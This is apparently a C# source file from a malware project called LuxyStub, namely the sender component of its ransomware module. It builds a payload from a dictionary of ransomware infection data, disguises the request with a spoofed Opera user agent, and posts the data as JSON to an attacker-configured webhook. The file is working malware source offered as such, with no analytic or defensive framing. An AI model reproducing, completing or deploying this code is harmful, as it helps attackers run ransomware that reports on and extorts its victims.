using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;

namespace LuxyStub.Modules.Ransomware.Components.Postman
{
    internal static class Sender
    {
        internal static async Task Post(Dictionary<string, int> RansomwareInfoDictionary)
        {
            PayloadGen payloadGen = new PayloadGen(RansomwareInfoDictionary);
            string payload = await payloadGen.GetPayload();

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                    client.DefaultRequestHeaders.UserAgent.ParseAdd(
                        "Opera/9.80 (Windows NT 6.1; YB/4.0.0) Presto/2.12.388 Version/12.17");
                        StringContent jsonContent = new StringContent(payload, Encoding.UTF8, "application/json");
                        await client.PostAsync(Settings.Webhook, jsonContent);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}